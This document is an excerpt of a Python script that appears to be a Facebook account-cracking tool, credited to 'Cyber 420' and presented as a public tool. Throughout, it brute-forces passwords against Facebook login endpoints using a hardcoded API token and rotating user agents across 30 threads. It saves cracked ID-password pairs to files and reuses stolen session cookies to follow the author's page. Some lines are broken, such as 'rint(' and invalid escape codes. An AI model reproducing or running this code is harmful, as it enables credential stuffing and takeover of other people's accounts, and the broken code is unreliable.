	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m[JAHIDUL-CP] {idf} * {pw}')
				...
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/JAHIDUL-CP.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
def free(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r %s[JAHIDUL] %s/%s  [OK] %s |  [CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;92m [Successful-JAHIDUL] {idf} * {pw}')
				...
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [Successful-JAHIDUL] {idf} * {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/Successful-JAHIDUL.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
.............. 01790104683.............
\033[1;92m══════════════════════════════════════════════════
\33[1;36m𝔸𝕦𝕥𝕙𝕠𝕣   : Mr.Nahim
\33[1;32m𝔽𝕒𝕔𝕖𝕓𝕠𝕠𝕜 : Chand Muhammad Khan        
\33[1;33m𝔾𝕚𝕥𝕙𝕦𝕓   : Nahim404
\33[1;34m𝕍𝕖𝕣𝕤𝕚𝕠𝕟  : 4.0.1
\33[1;34m𝕥𝕖𝕒𝕞       : Cyber 420 The Silent Killer's
\033[1;92m══════════════════════════════════════════════════
\33[1;41m\33[1;37m▓░▒░▒▓░▒░▒▓░▒▓░▒▓█[ PUBLIC TOOLS ]█▓▒░▓░▒░▒▓░▒▓░▒▓\33[0m
\033[1;93m══════════════════════════════════════════════════"""
class Main:
	def __init__(self):
		self.id = []
		...
		print("")
		print("\33[1;37m")
		print("\033[1;37mNote : \33[1;41m\33[1;37mApprovel Follow My Page\33[0m")
		print("══════════════════════════════════════════════════")
		print("══════════════════════════════════════════════════")
		print("\033[1;32m  |1| \33[1;37m Name MY FACEBOOK PAGE ")
		...
		if Baloch in ["", " "]:
			...
			print("══════════════════════════════════════════════════")
			time.sleep(3.0)
			print("\033[1;32m  You Not Request The Facebook Page again Follow Please")
			print("══════════════════════════════════════════════════")
			input("\n\097[1;37m Page NAME :  \033[1;37m")
			time.sleep(3.1)
			print("══════════════════════════════════════════════════")
			print("\034[1;94m THANKS FOR FOLLOW MY PAGE ")
			time.sleep(3.0)
			os.system("clear")
		print(logo)
		print(" ══════════════════════════════════════════════════")
		print("\033[1;37m")
		print(" \033[1;34m[1]\033[1;37m CRACK FILE")
		print(" \033[1;36m[2] CRACK PUBLICK ID")
		print(" \33[1;33m[3] BANGLADESH NUMBER IdCLONING")
		print(" \033[1;96m[4] 2004 TO 2010[OPEN]")
		print(" \33[1;92m[5] 2011 TO 2020 ")
		print("\033[1;93m [E] EXIT \n")
	...
	def old(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print(" \033[0;95m[+] Note: CP AC OPEN 70% JUST NOW")
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		sys.stdout.write(
			"\r [+]%s> /[MS.FARIN]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[Successful-MS.FARIN]%s | %s\033[1;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Successful-JAHIDUL.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;32m[Ms.Farin Ok-Just Now] %s | %s\033[1;32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("Ms.Farin Ok-Just Now").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		for pw in pwx:
			...
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[Ms.Farin Ok-Just Now Login] %s | %s\033[0;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Ms.Farin Ok-Just Now Login","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;32m[Successful-MS.FARIN] %s | %s\033[1;32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("Successful-MS.FARIN.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue
